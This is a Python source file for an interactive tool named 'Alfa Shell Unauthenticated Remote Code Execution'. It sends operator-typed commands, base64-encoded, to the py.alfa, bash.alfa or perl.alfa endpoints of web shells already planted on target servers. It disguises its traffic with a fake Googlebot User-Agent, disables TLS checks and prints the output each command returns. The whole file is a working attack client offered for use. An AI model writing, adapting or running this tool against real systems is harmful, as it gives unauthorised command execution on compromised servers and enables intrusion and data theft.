import requests
import base64
import warnings
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore, Style, init

# Initialize colorama
init(autoreset=True)

# Define colors
RED = Fore.RED
GREEN = Fore.GREEN
YELLOW = Fore.YELLOW
BLUE = Fore.BLUE
WHITE = Fore.WHITE
MAGENTA = Fore.MAGENTA
RESET = Style.RESET_ALL

warnings.simplefilter('ignore', InsecureRequestWarning)

def execute_command(url, command):
    try:
        encoded_command = base64.b64encode(command.encode()).decode()
        encoded_check = base64.b64encode(b"Command Execution:").decode()

        data = {
            "cmd": encoded_command,
            "check": encoded_check
        }

        headers = {
            "User-Agent": "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)"
        }

        print(f"{RESET}[INFO] Sending command: {GREEN}{command}{RESET}")
        response = requests.post(url, data=data, headers=headers, timeout=10, verify=False)

        if response.status_code == 200:
            print(f"{GREEN}[INFO] Command executed successfully.{RESET}")
            print(f"{YELLOW}[OUTPUT]:{RESET}")
            print(response.text)
        else:
            print(f"{RED}[ERROR] HTTP Status Code: {response.status_code}{RESET}")
    except requests.exceptions.RequestException as e:
        print(f"{RED}[ERROR] Request failed: {e}{RESET}")
    except Exception as e:
        print(f"{RED}[ERROR] {e}{RESET}")

def main():
    print(f"{YELLOW}Alfa Shell Unauthenticated Remote Code Execution{RESET}")
    print(f"{YELLOW}1. py.alfa{RESET}")
    print(f"{YELLOW}2. bash.alfa{RESET}")
    print(f"{YELLOW}3. perl.alfa{RESET}")
    
    try:
        choice = int(input(f"{RESET}Enter your choice (1/2/3): {RESET}"))
        if choice == 1:
            endpoint = "py.alfa"
        elif choice == 2:
            endpoint = "bash.alfa"
        elif choice == 3:
            endpoint = "perl.alfa"
        else:
            print(f"{RED}[ERROR] Invalid choice. Exiting.{RESET}")
            return
        
        target_url = input(f"{GREEN}Enter the target URL for {endpoint}: {RESET}")
        if not target_url.startswith("http"):
            print(f"{RED}[ERROR] Invalid URL. Please include 'http://' or 'https://'.{RESET}")
            return

        print(f"{RESET}Target URL set to: {GREEN}{target_url}{RESET}")

        while True:
            command = input(f"{YELLOW}Enter command to execute (or 'exit' to quit): {RESET}")
            if command.lower() == "exit":
                print(f"{YELLOW}[INFO] Exiting...{RESET}")
                break
            execute_command(target_url, command)

    except ValueError:
        print(f"{RED}[ERROR] Invalid input. Please enter a number.{RESET}")

if __name__ == "__main__":
    main()
